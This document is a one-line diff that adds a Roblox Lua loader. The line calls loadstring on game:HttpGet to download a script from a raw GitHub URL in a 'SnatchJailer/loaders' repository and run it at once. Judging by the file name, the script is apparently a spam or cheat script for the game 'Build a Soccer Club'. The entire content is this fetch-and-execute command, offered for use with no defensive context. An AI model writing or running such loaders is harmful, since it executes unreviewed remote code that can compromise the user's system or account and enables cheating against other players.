@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/build-a-soccer-club-spam2-5tqxix2bo69sgd.lua"))()
